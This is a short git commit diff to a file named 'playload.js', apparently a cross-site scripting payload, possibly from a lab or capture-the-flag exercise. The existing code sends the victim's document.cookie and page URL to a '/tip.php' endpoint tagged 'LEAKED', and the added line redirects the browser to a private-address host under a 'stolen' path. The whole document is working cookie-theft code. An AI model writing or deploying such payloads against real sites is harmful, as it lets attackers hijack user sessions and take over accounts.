3820054784678c4dd5164c75ded5cd184886c093
taffconnexion-prog <taffconnexion@gmail.com>
2026-09-01 22:25:09 +0200

    Update playload.js

--- playload.js
+++ playload.js
@@ -3,3 +3,4 @@ fetch("/tip.php", {
   headers: {"Content-Type": "application/x-www-form-urlencoded"},
   body: "title=LEAKED&body=" + encodeURIComponent(document.cookie + " | " + document.location.href) + "&link=http://x/&intake="
 });
+window.location = "http://172.28.3.2/account.php/stolen" + Date.now() + ".css";
